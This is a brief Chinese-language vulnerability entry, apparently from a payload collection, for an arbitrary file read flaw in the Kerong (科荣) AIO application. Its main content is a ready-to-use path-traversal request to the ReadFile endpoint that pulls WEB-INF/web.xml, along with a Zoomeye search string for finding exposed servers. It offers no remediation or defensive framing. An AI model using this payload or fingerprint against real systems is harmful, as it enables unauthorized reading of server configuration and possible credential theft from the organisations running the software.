# 科荣AIO-ReadFile存在任意文件读取漏洞

科荣 ｜ 任意文件读取/写入 ｜ —

**Payload**
```
/ReadFile?tempFile=path&path=../../website/WEB-INF/&fileName=web.xml
```
- **其他**：Zoomeye: "changeAccount('8000')"